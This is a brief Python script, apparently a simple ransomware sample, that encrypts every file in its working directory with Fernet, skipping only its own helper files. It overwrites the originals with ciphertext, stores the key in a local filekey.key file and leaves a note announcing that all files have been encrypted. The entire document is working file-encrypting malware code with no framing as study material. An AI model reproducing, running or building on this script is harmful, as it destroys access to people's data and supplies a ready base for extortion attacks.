from cryptography.fernet import Fernet
import os

files = []

for file in os.listdir():

   if file == 'encrypt.py' or file == 'filekey.key' or file=='decrypt.py' or file == '1.readme.txt':
      continue

   else:
      files.append(file)

key = Fernet.generate_key()
with open('filekey.key', 'wb') as filekey:
   filekey.write(key)

for file in files:

   # opening the original file to encrypt
   with open(file, 'rb') as f:
      content = f.read()

   # encrypting the file
   encrypted = Fernet(key).encrypt(content)

   # writing the encrypted data
   with open(file, 'wb') as encrypted_file:
      encrypted_file.write(encrypted)


# Leaving our message
with open('1.readme.txt', 'wt') as f:
   f.write('All of your files has been encrypted!!!')